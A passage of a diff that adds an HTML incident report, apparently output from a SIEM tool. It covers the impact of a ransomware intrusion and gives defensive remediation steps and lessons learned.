+<span class="ioc-tag">CORP\jsmith</span>
+<span class="ioc-tag">LocalSystem</span>
+<span class="ioc-tag">NT</span>
+        </div>
+
+        <!-- 5. Impact Assessment -->
+        <div class="section">
+            <h2>5. Impact Assessment</h2>
+            
+            <h3>Credential Compromise</h3>
+            <p>Credential dumping and/or Kerberoasting was detected. All passwords for
+            affected service accounts and users should be considered compromised.
+            The attacker may possess plaintext credentials or crackable hashes that
+            enable persistent access.</p>
+            <p><strong>Affected scope:</strong> All accounts that authenticated on
+            compromised hosts during the incident window.</p>
+
+            <h3>Lateral Movement</h3>
+            <p>RDP-based lateral movement was detected, indicating the attacker
+            expanded access beyond the initial compromised host. Multiple systems
+            may be affected including critical infrastructure (Domain Controllers,
+            file servers).</p>
+
+            <h3>Ransomware Encryption</h3>
+            <p><strong style="color:#ff1744;">CRITICAL:</strong> Ransomware encryption
+            activity was detected. File systems on affected hosts may be partially or
+            fully encrypted. Volume Shadow Copies may have been deleted, preventing
+            native restoration.</p>
+            <p><strong>Data at risk:</strong> All user files, databases, and application
+            data on affected hosts.</p>
+
+            <h3>Data Exfiltration</h3>
+            <p>Data exfiltration was detected. Sensitive information may have been
+            transferred to external attacker-controlled infrastructure. The volume
+            and type of exfiltrated data should be assessed to determine regulatory
+            notification requirements (GDPR, HIPAA, PCI-DSS).</p>
+
+            <h3>Evidence Destruction</h3>
+            <p>Event log clearing was detected, indicating the attacker attempted
+            to destroy forensic evidence. Some events may be missing from the
+            timeline. Review backup log sources (Syslog, SIEM) for complete
+            picture.</p>
+        </div>
+
+        <!-- 6. Remediation Plan -->
+        <div class="section">
+            <h2>6. Remediation Plan</h2>
+            
+            <div class="remediation-box immediate">
+                <h3>Immediate Actions (0-4 hours)</h3>
+                <ul style="margin:10px 0 0 20px;"><li>Isolate affected hosts from the network to prevent further spread</li>
+<li>Preserve forensic evidence (memory dumps, disk images) before remediation</li>
+<li>Reset passwords for all compromised accounts identified in IOC section</li>
+<li>Reset the Kerberos krbtgt account password TWICE (Golden Ticket mitigation)</li>
+<li>Block attacker source IPs at the perimeter firewall</li>
+<li>DO NOT PAY THE RANSOM - contact law enforcement (FBI IC3)</li>
+<li>Identify and isolate the ransomware process (kill PID)</li>
+<li>Block all communication to identified C2 IP addresses</li></ul>
+            </div>
+            <div class="remediation-box short-term">
+                <h3>Short-Term Actions (1-7 days)</h3>
+                <ul style="margin:10px 0 0 20px;"><li>Audit all service account SPNs and rotate to AES-256 encryption</li>
+<li>Deploy Credential Guard on all Domain Controllers</li>
+<li>Enforce account lockout policies (5 attempts, 30-minute lockout)</li>
+<li>Implement MFA for all remote access (RDP, VPN, OWA)</li>
+<li>Restore affected systems from known-good backups</li>
+<li>Scan all systems for ransomware persistence mechanisms</li>
+<li>Conduct data loss assessment - identify what was exfiltrated</li>
+<li>Notify legal team for regulatory breach notification assessment</li>
+<li>Enable centralized log forwarding (events survive local deletion)</li></ul>
+            </div>
+            <div class="remediation-box ">
+                <h3>Long-Term Improvements (30-90 days)</h3>
+                <ul style="margin:10px 0 0 20px;"><li>Implement Privileged Access Workstations (PAW) for admin accounts</li>
+<li>Deploy LSASS protection via Windows Defender Credential Guard</li>
+<li>Deploy adaptive authentication with risk-based MFA</li>
+<li>Implement immutable backup strategy (3-2-1 rule with air-gapped copy)</li>
+<li>Deploy DLP (Data Loss Prevention) at network egress points</li>
+<li>Deploy tamper-proof logging with write-once storage</li>
+<li>Conduct tabletop exercises quarterly to improve incident response</li>
+<li>Review and update detection rules based on gaps identified in this incident</li>
+<li>Schedule penetration test to validate remediation effectiveness</li></ul>
+            </div>
+        </div>
+
+        <!-- 7. Lessons Learned -->
+        <div class="section">
+            <h2>7. Lessons Learned</h2>
+            
+            <h3>Detection Gaps</h3>
+            <p>The following MITRE ATT&amp;CK techniques were present but did not trigger
+            detection rules: <strong>T1530: Unknown</strong>. New SIGMA or YAML rules should
+            be created to detect these techniques in future incidents.</p>
+
+        <h3>Mean Time to Detect (MTTD)</h3>
+        <p>Events were ingested and correlated in real-time by Guardian SIEM's EventBus
+        pipeline. For future incidents, establish a baseline MTTD metric and track improvements.</p>
+
+        <h3>Process Recommendations</h3>
+        <ul style="margin:10px 0 0 20px;">
+            <li>Document this incident in the organization's incident tracking system</li>
+            <li>Schedule a post-incident review within 5 business days</li>
+            <li>Update runbooks with any new procedures discovered during response</li>
+            <li>Share anonymized IOCs with industry ISAC for community defense</li>
+            <li>Review this report with the security team for training purposes</li>
+        </ul>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Guardian SIEM — Automated Incident Report</p>
+            <p>Generated 2026-02-13 14:48:33 |
+               Report ID: INC-2026-0213-1448 |
+               Classification: Security Incident</p>
+            <p style="margin-top:8px;">This report was generated by Guardian SIEM's automated analysis engine.
+               All findings should be validated by a human analyst before taking action.</p>
+        </div>
+    </div>
+</body>
+</html>
